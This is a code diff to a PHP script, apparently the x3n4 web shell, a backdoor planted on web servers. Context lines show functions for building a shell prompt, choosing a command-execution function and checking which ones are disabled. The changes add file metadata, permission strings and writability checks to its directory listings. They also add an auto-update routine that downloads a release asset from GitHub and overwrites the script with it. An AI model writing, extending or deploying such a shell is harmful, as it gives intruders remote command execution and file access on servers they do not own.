@@ -1,5 +1,7 @@
 <?php
 
+// error_reporting(0);
+
 define('X3N4_VERSION', 'v0.2.0-alpha');
 
 session_start();
@@ -11,6 +13,7 @@ function get_shell_prefix()
 {
     return get_current_user() . '@' . php_uname('n') . ':' . getcwd() . ' $ ';
 }
+
 function get_shell_command()
 {
     static $shell_command;
@@ -35,6 +38,7 @@ function get_shell_command()
 
     return $shell_command;
 }
+
 function execute_command($command)
 {
     switch (get_shell_command()) {
@@ -55,6 +59,7 @@ function execute_command($command)
             return 'None available function to run your command, sorry. :(';
     }
 }
+
 function disabled_functions()
 {
     static $disabled_fn;
@@ -68,53 +73,84 @@ function disabled_functions()
 
     return $disabled_fn;
 }
+
 function is_function_disabled($function)
 {
     return in_array($function, disabled_functions());
 }
+
 function auto_update()
 {
     $options  = array('http' => array('user_agent' => 'custom user agent string'));
     $context  = stream_context_create($options);
-    file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
-    file_put_contents(__FILE__, file_get_contents('https://raw.githubusercontent.com/jorge-matricali/x3n4/master/x3n4.php', false, $context));
-}
-function tree($dir)
-{
-    $ffs = scandir($dir);
-
-    unset($ffs[array_search('.', $ffs, true)]);
-    unset($ffs[array_search('..', $ffs, true)]);
-
-    // prevent empty ordered elements
-    if (count($ffs) < 1) {
-        return;
-    }
-
-    echo '<ol>';
-    foreach ($ffs as $ff) {
-        echo '<li>', $ff;
-        if (is_dir($dir.'/'.$ff)) {
-            tree($dir.'/'.$ff);
+    $releases = @json_decode(@file_get_contents('https://api.github.com/repos/jorge-matricali/x3n4/releases', false, $context));
+    if ($releases) {
+        $asset = $releases[0]->assets[0]->browser_download_url;
+        if ($asset) {
+            file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
+            file_put_contents(__FILE__, file_get_contents($asset, false, $context));
         }
-        echo '</li>';
     }
-    echo '</ol>';
 }
+
 function list_folder_files($dir)
 {
     $files = scandir($dir);
     $data = array();
     foreach ($files as $file) {
         $fpath = $dir . DIRECTORY_SEPARATOR . $file;
+        $mtime = filemtime($fpath);
         array_push($data, array(
             'filename' => $file,
             'type' => is_dir($fpath) ? 'folder' : 'file',
             'fullpath' => realpath($fpath),
+            'size' => is_dir($fpath) ? 0 : filesize($fpath),
+            'permissions' => file_permissions($fpath),
+            'modifiedAt' => ($mtime ? @date('c', $mtime) : '')
         ));
     }
     return $data;
 }
+
+function file_permissions($filename)
+{
+    $p = fileperms($filename);
+    if (($p & 0xC000) == 0xC000) { // Socket
+        $i = 's';
+    } elseif (($p & 0xA000) == 0xA000) { // Enlace Simbólico
+        $i = 'l';
+    } elseif (($p & 0x8000) == 0x8000) { // Regular
+        $i = '-';
+    } elseif (($p & 0x6000) == 0x6000) { // Especial Bloque
+        $i = 'b';
+    } elseif (($p & 0x4000) == 0x4000) { // Directorio
+        $i = 'd';
+    } elseif (($p & 0x2000) == 0x2000) { // Especial Carácter
+        $i = 'c';
+    } elseif (($p & 0x1000) == 0x1000) { // Tubería FIFO
+        $i = 'p';
+    } else { // Desconocido
+        $i = 'u';
+    }
+
+    // Propietario
+    $i .= (($p & 0x0100) ? 'r' : '-');
+    $i .= (($p & 0x0080) ? 'w' : '-');
+    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
+
+    // Grupo
+    $i .= (($p & 0x0020) ? 'r' : '-');
+    $i .= (($p & 0x0010) ? 'w' : '-');
+    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
+
+    // Mundo
+    $i .= (($p & 0x0004) ? 'r' : '-');
+    $i .= (($p & 0x0002) ? 'w' : '-');
+    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
+
+    return $i;
+}
+
 function output_json($output = '')
 {
     $output_data = array(
@@ -196,6 +232,7 @@ if (isset($_REQUEST['dir'])) {
     $t2 = microtime(true);
     output_json(array(
         'path' => $directory,
+        'isWritable' => @is_writable(realpath($directory)),
         'files' => $output,
         'took' => round($t2 - $t1, 2),
     ));
